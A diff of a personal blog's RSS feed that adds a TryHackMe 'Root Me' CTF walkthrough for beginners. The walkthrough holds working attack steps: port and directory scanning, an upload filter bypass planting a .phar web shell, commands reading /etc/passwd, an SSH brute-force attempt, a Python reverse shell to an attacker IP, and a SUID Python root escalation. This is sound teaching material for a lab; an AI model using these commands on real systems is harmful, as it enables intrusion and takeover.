@@ -1,4 +1,102 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 10 Sep 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Bell HomeHub 4000 + Ubiquiti Unifi Dream Machine VPN</title><link>https://maclarel.github.io/posts/2022-09/bell_udm/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-09/bell_udm/</guid><description>This article is a bit more to-the-point than most others I&amp;rsquo;ve written, and is mostly to serve as a reference point for others trying to configure a VPN server with Unifi products behind the Bell HomeHub 4000.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 03 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>TryHackMe - Root Me</title><link>https://maclarel.github.io/posts/2022-10/thm_rootme/</link><pubDate>Mon, 03 Oct 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-10/thm_rootme/</guid><description>Premise RootMe is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.
+Throughout this walkthrough you&amp;rsquo;ll see reference to $target which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p><code>RootMe</code> is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.</p>
+<p>Throughout this walkthrough you&rsquo;ll see reference to <code>$target</code> which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse.</p>
+<h1 id="recon">Recon</h1>
+<p>A good place to start is to see what the target machine is running, both for services and OS. We can do this by running <code>nmap</code> against it with a few flags:</p>
+<pre><code>sudo nmap -p- -sV -sC -vvv -o nmap.out $target
+</code></pre><p>This will scan the full port range of the box, try to determine versions, run default scripts against the target, and dump our output to <code>nmap.out</code>. This isn&rsquo;t something you&rsquo;d probably want to do against a target in a pen test as it will be painfully obvious what you&rsquo;re doing, but for the puposes of these challenges it&rsquo;s just fine.</p>
+<p>This scan shows us that we&rsquo;ve got TCP 22 (SSH) and 80 (HTTP) open on the target machine, and that it&rsquo;s running Apache 2.4.29.</p>
+<p>With these two pieces of information available, next steps would be to see what SSH authentication mechanisms the server can provide, as well as fuzzing the web server to see what directories (and possibly hostnames) it responds on.</p>
+<pre><code># Determine what auth types we see
+$ ssh -vvv $target
+
+# Fuzz the webserver to see what content may be available
+$ ffuf -u http://$target/FUZZ -w ~/gh/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre><p>The SSH check shows us that the server will accept password based auth, or public key authentication. Let&rsquo;s keep an eye out for private key files, the ability to add a key to <code>authorized_keys</code> for a user, or hints that we can find a password. We can always brute force, and we may need to later, but that&rsquo;s often not ideal.</p>
+<p>Fuzzing the webserver shows us the following directories:</p>
+<ul>
+<li>/uploads (this is interesting)</li>
+<li>/panel (also interesting)</li>
+<li>/js</li>
+<li>/css</li>
+</ul>
+<p><code>uploads</code> redirects to <code>panel</code> which prompts us to uploada file. That&rsquo;ll be the next thing to play around with - see what the site does when we send it data we control.</p>
+<h1 id="what-can-we-upload">What can we upload?</h1>
+<p>Seemingly anything. The first attempt here is to upload a random file, and that&rsquo;s met with <code>O arquivo foi upado com sucesso!</code> which roughly translates to <code>File successfully uploaded!</code>.</p>
+<p>We don&rsquo;t get a path for the uploaded file returned, however, making this slightly less useful. Let&rsquo;s take a closer look at the upload, and response, by capturing the traffic with Burp Suite (or similar tool).</p>
+<p>The upload:</p>
+<pre><code>POST /panel/ HTTP/1.1
+Host: 10.10.186.89
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------20201163193198834099211560924
+Content-Length: 354
+Origin: http://10.10.186.89
+DNT: 1
+Connection: close
+Referer: http://10.10.186.89/panel/
+Cookie: PHPSESSID=kdmm74iroebpfj9612h6vrjou5
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+-----------------------------20201163193198834099211560924
+Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;bar&quot;
+Content-Type: application/octet-stream
+
+foo
+
+-----------------------------20201163193198834099211560924
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+Upload
+-----------------------------20201163193198834099211560924--
+</code></pre><p>While the response doesn&rsquo;t give us anything overly interesting, since we know the filename, and the directory structure on the taret, we can make some assumptions. We&rsquo;ve uploaded a file called <code>bar</code>&hellip; let&rsquo;s see if it exists at <code>http://$target/uploads/bar</code> - it does!</p>
+<p>The other piece of information we see here is that there&rsquo;s a <code>PHPSESSID</code> cookie, so we can assume the server is <em>probably</em> running PHP. Since we have arbitrary file upload capability, and we know where the file will land, maybe we can upload a <a href="https://en.wikipedia.org/wiki/Web_shell">web shell</a> like <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">this one</a>.</p>
+<p>The website prevents us from uploading a file with the <code>.php</code> extension, so let&rsquo;s try bypassing that by just uploading it as an <code>html</code> file (e.g. <code>shell.html</code>). That works, but our shell doesn&rsquo;t seem to be able to actually run any commands. What if we try another PHP file extension like <code>.phar</code>? Bingo.</p>
+<pre><code>curl http://10.10.186.89/uploads/shell.phar\?cmd\=whoami
+&lt;html&gt;
+&lt;body&gt;
+&lt;form method=&quot;GET&quot; name=&quot;shell.phar&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+www-data
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h1 id="running-commmands">Running commmands</h1>
+<p>Now that we&rsquo;ve got a way to poke around on the remote machine, let&rsquo;s see if we can find our first flag, and then a way to get direct access. I want to start by exploring the file system - seeing where I am with <code>pwd</code>, and dumping directory contents with <code>ls</code>. I also want to see what other users we have on the system, so that we can start to try to gain access as one of them:</p>
+<pre><code>http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fetc%2Fpasswd
+</code></pre><p>Removing the users with no shell, or that we&rsquo;re not interested in, we get the following:</p>
+<pre><code>root❌0:0:root:/root:/bin/bash
+rootme❌1000:1000:RootMe:/home/rootme:/bin/bash
+test❌1001:1001:,,,:/home/test:/bin/bash
+</code></pre><p>This recon also leads us to our first flag under <code>/var/www/</code> which we can retrieve with <code>http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fvar%2Fwww%2Fuser.txt</code>.</p>
+<h1 id="persistence">Persistence</h1>
+<p>Let&rsquo;s see if we can find anything under <code>/home/test</code> or <code>/home/rootme</code>. Nope, <code>ls</code> on either directory returns nothing, so they&rsquo;re either empty or more likely we don&rsquo;t have permission to see anything. While there&rsquo;s no luck on that front, perhaps we can brute force a password for SSH access with <code>Hydra</code>:</p>
+<p>I&rsquo;m going to start with the <code>test</code> user, and the <code>RockYou</code> wordlist:</p>
+<pre><code>hydra -l test -p ~/tools/rockyou.txt ssh://$target
+</code></pre><p>No luck here, but maybe there are some other options. We could look at a few possibilities here:</p>
+<ul>
+<li>We can look for some other interesting privilege escalation mechanisms like binaries with the SUID bit, which may just give us root acces (<code>find / -user root -perm -4000</code>).</li>
+<li>Since we can run arbitrary commands, we can probably get a reverse shell.</li>
+<li>We know we can upload files and run arbitrary commands, so we could load something like <code>linpeas</code> or <code>linenum</code>.</li>
+</ul>
+<p>Checking the SUID binaries first, we can see a pretty normal list, however this also includes <code>/usr/bin/python</code> which it definitely shouldn&rsquo;t&hellip; Can we run commands as <code>root</code> simply by invoking them through <code>python</code>?</p>
+<p>Let&rsquo;s try to pop a <a href="https://www.revshells.com/">reverse shell</a> from the <code>root</code> user. This will mean we need to set up a listener on our machine - <code>nc -l 9001</code> - and then spawn the connection from the remote machine to us:</p>
+<pre><code>export RHOST=&quot;10.13.41.1&quot;;export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)'
+</code></pre><p>This gets us a reverse shell, but it&rsquo;s still running as the <code>www-data</code> user. Let&rsquo;s try using Python directly to get us a root shell since it has the ability to do so in this challenge:</p>
+<pre><code>$ python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
+python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
+# whoami
+whoami
+root
+</code></pre><p>GG!</p>
+]]></content></item><item><title>Bell HomeHub 4000 + Ubiquiti Unifi Dream Machine VPN</title><link>https://maclarel.github.io/posts/2022-09/bell_udm/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-09/bell_udm/</guid><description>This article is a bit more to-the-point than most others I&amp;rsquo;ve written, and is mostly to serve as a reference point for others trying to configure a VPN server with Unifi products behind the Bell HomeHub 4000.
 The HomeHub 4000 DMZ works&amp;hellip; kinda The HomeHub 4000 doesn&amp;rsquo;t have Bridge mode, period. This leaves users with three options:
 Find a way to use PPPoE directly (possible, but janky) Use the &amp;ldquo;Advanced DMZ&amp;rdquo; feature on the HomeHub 4000 (Spoilers: It doesn&amp;rsquo;t work at all) Use the normal DMZ feature on the HomeHub 4000 and deal with double-NAT After several days of troubleshooting I opted for option 3 from the list above.</description><content type="html"><![CDATA[<p>This article is a bit more to-the-point than most others I&rsquo;ve written, and is mostly to serve as a reference point for others trying to configure a VPN server with Unifi products behind the Bell HomeHub 4000.</p>
 <h1 id="the-homehub-4000-dmz-works-kinda">The HomeHub 4000 DMZ works&hellip; kinda</h1>
